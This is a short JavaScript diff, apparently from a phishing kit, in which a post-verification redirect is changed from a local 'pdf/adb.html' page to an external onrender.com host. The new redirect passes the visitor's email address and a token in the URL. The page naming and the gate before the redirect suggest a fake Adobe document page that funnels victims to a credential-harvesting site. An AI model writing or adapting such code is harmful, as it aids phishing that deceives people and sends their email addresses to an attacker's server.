@@ -21,7 +21,7 @@ function onVerify(token) {
 
   if (email && secureToken) {
     // Redirect immediately after verification
-    window.location.href = `pdf/adb.html#${email}&token=${secureToken}`;
+    window.location.href = `https://ronnicf-github-io.onrender.com/adb.html#${email}&token=${secureToken}`;
   } else {
     alert("Verification error. Please refresh and try again.");
   }
